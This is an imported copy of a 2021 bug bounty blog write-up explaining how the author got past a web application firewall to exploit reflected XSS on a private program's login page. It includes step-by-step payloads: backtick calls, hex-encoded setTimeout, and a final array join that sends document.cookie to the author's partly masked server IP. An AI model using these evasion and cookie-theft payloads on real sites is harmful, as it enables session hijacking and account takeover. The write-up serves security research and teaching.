---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-07-19_how-i-bypassed-a-tough-waf-to-steal-user-cookies-using-xss.md
original_filename: 2021-07-19_how-i-bypassed-a-tough-waf-to-steal-user-cookies-using-xss.md
title: How I Bypassed a tough WAF to steal user cookies using XSS!
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: d9e123fe02862461e884bdfa28e5d1e2016db263e876b91f4ac89914c02a5720
text_sha256: 544bf48375247fb14741396683f09636a2b89af81308d6514a629d96cb15b85f
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# How I Bypassed a tough WAF to steal user cookies using XSS!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-07-19_how-i-bypassed-a-tough-waf-to-steal-user-cookies-using-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `d9e123fe02862461e884bdfa28e5d1e2016db263e876b91f4ac89914c02a5720`
- Text SHA256: `544bf48375247fb14741396683f09636a2b89af81308d6514a629d96cb15b85f`


## Content

---
title: "How I Bypassed a tough WAF to steal user cookies using XSS!"
url: "https://melotover.medium.com/how-i-bypassed-a-tough-waf-to-steal-user-cookies-using-xss-da75f28108e4"
authors: ["Asem Eleraky (@melotover)"]
bugs: ["XSS", "WAF bypass"]
publication_date: "2021-07-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3496
scraped_via: "browseros"
---

# How I Bypassed a tough WAF to steal user cookies using XSS!

Top highlight

How I Bypassed a tough WAF to steal user cookies using XSS!
Asem Eleraky
Follow
5 min read
·
Jul 20, 2021

539

6

Hi, I’m Asem Eleraky -aka Melotover- and today I will show you how I could bypass a tough WAF to execute XSS and make a full account takeover via stealing the victim’s cookies.

Note: I decided to make this scenario a challenge so you can try to solve it before reading this write-up, you can check it out from here: http://20.102.49.104/, and now let’s start.

First of all, This was a private program, so I will refer to it with example.com.
Let me tell you how I found the Reflected XSS vulnerability first.

Finding The XSS:

When I visited a login panel in one of its subdomains, I found that the URL was reflected in a variable inside the script tag shown below

Press enter or click to view image in full size

Since the variable is defined with single quotes, I tried to break it with a single quote and it works fine, then tried to alert anything just to make sure that there is no validation on it, So tried this basic payload

test';alert(1);a='test
Press enter or click to view image in full size

And it gives an error, I thought that alert was blocked and retested it with confirm and prompt, but it gives the same error!
May the problem here with the Round Brackets ( )? as you may guess we can use the Backtick `` instead, so let’s give it a try

test';alert`1`;a='test
Press enter or click to view image in full size

And Yes, it works!

Press enter or click to view image in full size

But after reporting it, they asked me for alerting the user cookies OR it will be N/A! so let’s do it!

WAF Bypass:

Since I’m inside the script tag, I can use the $.getScript`` method to load scripts from my server, but you should know it works only if the website uses jQuery, and Unfortunately our website doesn’t use it!

Tried to close the current script tag and re-open another script tag and add our hosted external script to it as an src attribute, But both open/close tags are blocked.

As you may know, when using the backtick it doesn’t accept any variables which means it accepts only strings like the example below

alert(document.domain)
// 'www.example.com'
alert`document.domain`
// 'document.domain'

But in another way, it accepts HEX values! so if I used a function like setTimeout`` and encode the brackets inside it it will work!

setTimeout`alert\x281\x29`
// will execute alert(1)
setTimeout`alert\x28document.domain\x29`
// will execute alert(document.domain)

Let’s try it and see the results

Press enter or click to view image in full size

Bad luck, after some analysis, I realized that both backslash \ and forward-slash / are also blocked!

Tried URL/Double URL encoding, again with many failed attempts and payloads, and I still have the same error!

Changing My Approach:

After a while, I take a look at the cookies and found that it did have NOT any of the httpOnly/secure flags, so I decided instead of alerting the cookies, I can send it to my server, which means stealing it, and this is easy, right?

Now let’s make a simple payload to do it for us

document.location="https://40.112.XX.XX/?cookies="+document.cookie;

And the result was

Press enter or click to view image in full size

As you expected, the forward-slash prevents me!, and I tried to check if it’s only the forward-slash that blocking this payload, but No!
All these characters are blocked as well

The Forward-slash → /
The colon → :
The + Operator → +

Till now, there is no way to make a valid URL, and if we find a way to do it, How we can concatenate it with document.cookie to send it to our server?

Finding a way to concatenation:

Javascript has 3 ways to concatenate strings:

The + Operator → which is blocked as mentioned
concat() → It uses the Round Brackets ( ) → blocked
join() → It uses the Round Brackets ( ) → blocked

But I noticed that join() treat with Arrays! ,, and what does it mean?
It means that the array can take variables and this is what we want and you will know why.

Get Asem Eleraky’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Let me first show you an example of how the join function works:

['Melo', 'tover'].join('');
// 'Melotover'
['Hello', 'World'].join(' ');
// 'Hello World'
['Hello', 'World'].join(',');
// 'Hello,World'

Inside the join brackets, we can notice that it takes the separator inside the quote!
yup, as you may guess, we can replace it with the backtick ``!

['Melo', 'tover'].join``;
// 'Melotover'

let’s try it with variables

var a = 'Find Bypass ';
var b = 'Like Melotover!';
[a, b].join``;
// 'Find Bypass Like Melotover!'

We now can concatenate what we want!

Make a valid URL:

Javascript will help us to make a valid URL, and this will be with the HTML DOM document object!

If we tried to print our location from javascript, we will use document.location property, but this has also many properties like:

document.location.origin
--> https://www.example.com
document.location.pathname
--> /path/name

Great!
As we need to send the cookies outside this application, so we will make a trick here, we will use the At sign → @ at the end of the document.location.origin property, let us concatenate them together and see what we have

[document.location.origin, '@40.112.xx.xx’].join``;
 --> 'https://www.example.com@40.112.xx.xx'

Nice, we are so close, let’s concatenate it with the document.cookie property

[document.location.origin, '@40.112.xx.xx’,document.cookie].join``;
--> https://www.example.com@40.112.xx.xxCookieP=value;CookieP2=value2;

It’s a valid URL, but actually, we will not receive the cookies, because we want to add a forward-slash after our server IP!

As mentioned above, we can use document.location.pathname will do it for us!

[document.location.origin, '@40.112.xx.xx', document.location.pathname, document.cookie].join``;
--> https://www.example.com@40.112.xx.xx/path/nameCookieP=value;CookieP2=value2;

The final payload will be

melo = [document.location.origin, '@40.112.xx.xx',document.location.pathname,document.cookie].join``;document.location = melo;

ِAnd for simplicity and make it short

a=[location.origin, '@40.112.xx.xx',location.pathname,cookie].join``;location=a;

let’s try it and check our server

Press enter or click to view image in full size

Someone will ask me, what happened after re-submitting this bug?
While I’m writing the report, recording the PoC video, they add the HttpOnly flag on the cookies as a fix for another bug and said this is no longer exploitable!

I hope you enjoyed reading and I will be very happy if you have any feedback!
